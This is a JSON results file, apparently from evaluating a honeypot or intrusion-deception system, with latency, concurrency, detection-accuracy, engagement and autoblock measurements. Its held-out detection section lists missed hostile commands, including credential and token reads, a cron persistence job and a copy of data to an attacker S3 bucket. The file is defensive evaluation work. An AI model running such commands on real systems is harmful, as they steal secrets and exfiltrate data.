@@ -1,0 +1,334 @@
+{
+  "environment": {
+    "python": "3.13.16",
+    "platform": "linux",
+    "cpus": 2,
+    "build": "review2"
+  },
+  "A_proxy_overhead": {
+    "direct_victim": {
+      "n": 3000,
+      "mean": 0.089,
+      "p50": 0.065,
+      "p95": 0.205,
+      "p99": 0.271,
+      "max": 0.835
+    },
+    "via_controller": {
+      "n": 3000,
+      "mean": 0.151,
+      "p50": 0.125,
+      "p95": 0.284,
+      "p99": 0.395,
+      "max": 2.337
+    },
+    "overhead_mean_ms": 0.062,
+    "overhead_p95_ms": 0.079
+  },
+  "B_redirection": {
+    "sequential_sessions": 200,
+    "failed_sessions": 0,
+    "first_failure_at_session": null,
+    "trigger_rtt_ms": {
+      "n": 200,
+      "mean": 0.723,
+      "p50": 0.683,
+      "p95": 0.992,
+      "p99": 1.22,
+      "max": 1.946
+    },
+    "redirect_overhead_ms": {
+      "n": 200,
+      "mean": 0.551,
+      "p50": 0.522,
+      "p95": 0.807,
+      "p99": 1.043,
+      "max": 1.576
+    },
+    "post_redirect_rtt_ms": {
+      "n": 400,
+      "mean": 0.14,
+      "p50": 0.125,
+      "p95": 0.218,
+      "p99": 0.362,
+      "max": 0.59
+    }
+  },
+  "C_concurrency": [
+    {
+      "concurrent_sessions": 10,
+      "completed": 10,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 0.03,
+      "sessions_per_s": 397.2,
+      "benign_rtt_ms": {
+        "n": 30,
+        "mean": 1.575,
+        "p50": 1.475,
+        "p95": 2.963,
+        "p99": 2.983,
+        "max": 2.983
+      },
+      "trigger_rtt_ms": {
+        "n": 10,
+        "mean": 8.665,
+        "p50": 7.119,
+        "p95": 11.742,
+        "p99": 11.742,
+        "max": 11.742
+      },
+      "post_redirect_rtt_ms": {
+        "n": 20,
+        "mean": 2.049,
+        "p50": 1.997,
+        "p95": 4.071,
+        "p99": 4.352,
+        "max": 4.352
+      },
+      "forensic_sessions_logged": 10,
+      "forensic_commands_logged": 30,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 5,
+        "threads": 2,
+        "rss_mb": 12.9
+      }
+    },
+    {
+      "concurrent_sessions": 50,
+      "completed": 50,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 0.12,
+      "sessions_per_s": 412.3,
+      "benign_rtt_ms": {
+        "n": 150,
+        "mean": 1.609,
+        "p50": 1.327,
+        "p95": 4.424,
+        "p99": 7.001,
+        "max": 7.648
+      },
+      "trigger_rtt_ms": {
+        "n": 50,
+        "mean": 42.626,
+        "p50": 45.407,
+        "p95": 57.988,
+        "p99": 59.207,
+        "max": 59.207
+      },
+      "post_redirect_rtt_ms": {
+        "n": 100,
+        "mean": 7.689,
+        "p50": 6.529,
+        "p95": 12.877,
+        "p99": 15.938,
+        "max": 16.163
+      },
+      "forensic_sessions_logged": 50,
+      "forensic_commands_logged": 150,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 5,
+        "threads": 2,
+        "rss_mb": 14.3
+      }
+    },
+    {
+      "concurrent_sessions": 100,
+      "completed": 100,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 0.23,
+      "sessions_per_s": 435.6,
+      "benign_rtt_ms": {
+        "n": 300,
+        "mean": 1.419,
+        "p50": 1.252,
+        "p95": 3.054,
+        "p99": 4.014,
+        "max": 5.92
+      },
+      "trigger_rtt_ms": {
+        "n": 100,
+        "mean": 77.452,
+        "p50": 91.567,
+        "p95": 98.105,
+        "p99": 99.845,
+        "max": 102.358
+      },
+      "post_redirect_rtt_ms": {
+        "n": 200,
+        "mean": 14.902,
+        "p50": 15.578,
+        "p95": 22.896,
+        "p99": 31.357,
+        "max": 31.5
+      },
+      "forensic_sessions_logged": 100,
+      "forensic_commands_logged": 300,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 5,
+        "threads": 2,
+        "rss_mb": 16.5
+      }
+    },
+    {
+      "concurrent_sessions": 200,
+      "completed": 200,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 0.47,
+      "sessions_per_s": 423.4,
+      "benign_rtt_ms": {
+        "n": 600,
+        "mean": 1.746,
+        "p50": 1.363,
+        "p95": 4.343,
+        "p99": 6.672,
+        "max": 8.786
+      },
+      "trigger_rtt_ms": {
+        "n": 200,
+        "mean": 171.8,
+        "p50": 196.862,
+        "p95": 220.092,
+        "p99": 221.934,
+        "max": 222.085
+      },
+      "post_redirect_rtt_ms": {
+        "n": 400,
+        "mean": 32.575,
+        "p50": 30.274,
+        "p95": 47.881,
+        "p99": 61.664,
+        "max": 64.682
+      },
+      "forensic_sessions_logged": 200,
+      "forensic_commands_logged": 600,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 5,
+        "threads": 2,
+        "rss_mb": 19.1
+      }
+    },
+    {
+      "concurrent_sessions": 400,
+      "completed": 400,
+      "failed": 0,
+      "success_rate_pct": 100.0,
+      "error_types": [],
+      "wall_clock_s": 1.42,
+      "sessions_per_s": 282.0,
+      "benign_rtt_ms": {
+        "n": 1200,
+        "mean": 1.965,
+        "p50": 1.553,
+        "p95": 4.516,
+        "p99": 7.87,
+        "max": 15.875
+      },
+      "trigger_rtt_ms": {
+        "n": 400,
+        "mean": 255.03,
+        "p50": 315.278,
+        "p95": 370.894,
+        "p99": 376.265,
+        "max": 381.065
+      },
+      "post_redirect_rtt_ms": {
+        "n": 800,
+        "mean": 45.325,
+        "p50": 46.982,
+        "p95": 72.132,
+        "p99": 106.897,
+        "max": 108.925
+      },
+      "forensic_sessions_logged": 400,
+      "forensic_commands_logged": 1200,
+      "forensic_completeness_pct": 100.0,
+      "forensic_report_corrupt": false,
+      "controller_after_load": {
+        "open_fds": 5,
+        "threads": 2,
+        "rss_mb": 19.6
+      }
+    }
+  ],
+  "D_detection": {
+    "malicious": 50,
+    "benign": 50,
+    "TP": 50,
+    "FP": 0,
+    "FN": 0,
+    "TN": 50,
+    "precision": 1.0,
+    "recall": 1.0,
+    "f1": 1.0,
+    "accuracy": 1.0,
+    "false_negatives": [],
+    "false_positives": [],
+    "long_benign_session_flagged_by_count_rule": false,
+    "inspect_time_us": 6.59
+  },
+  "E_engagement": {
+    "profiles": {
+      "A_scanner": {
+        "score": 14.0,
+        "level": "Low",
+        "commands": 1,
+        "dwell_seconds": 0.0,
+        "sensitive_touches": 1
+      },
+      "B_explorer": {
+        "score": 30.6,
+        "level": "Medium",
+        "commands": 5,
+        "dwell_seconds": 1.2,
+        "sensitive_touches": 1
+      },
+      "C_data_thief": {
+        "score": 73.0,
+        "level": "High",
+        "commands": 11,
+        "dwell_seconds": 6.01,
+        "sensitive_touches": 7
+      }
+    }
+  },
+  "F_autoblock": {
+    "blocked_source_refused": true,
+    "other_source_still_served": true
+  },
+  "D2_heldout_detection": {
+    "malicious": 25,
+    "benign": 25,
+    "TP": 18,
+    "FP": 0,
+    "FN": 7,
+    "TN": 25,
+    "precision": 1.0,
+    "recall": 0.72,
+    "false_negatives": [
+      "cat ~/.kube/config",
+      "aws s3 cp /tmp/data.tgz s3://attacker-bucket/",
+      "echo '* * * * * /tmp/x.sh' | crontab -",
+      "history | grep ssh",
+      "gcloud auth print-access-token",
+      "cat /proc/self/environ",
+      "sqlmap -u http://app/login"
+    ],
+    "false_positives": []
+  }
+}
